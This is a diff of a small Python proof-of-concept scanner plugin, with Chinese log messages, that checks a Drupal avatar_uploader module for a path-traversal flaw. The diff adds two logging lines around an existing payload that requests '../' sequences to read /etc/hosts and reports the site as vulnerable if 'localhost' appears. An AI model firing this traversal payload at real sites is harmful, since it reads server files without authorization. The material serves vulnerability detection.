@@ -44,10 +44,12 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
+            self.output.info('正在尝试读取/etc/hosts文件信息')
             payload = "/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../../../../../../etc/hosts"
             vul_url = arg + payload
             response = requests.get(vul_url)
             if response.status_code ==200 and 'localhost' in response.text:
+                self.output.info('读取/etc/hosts文件信息成功')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
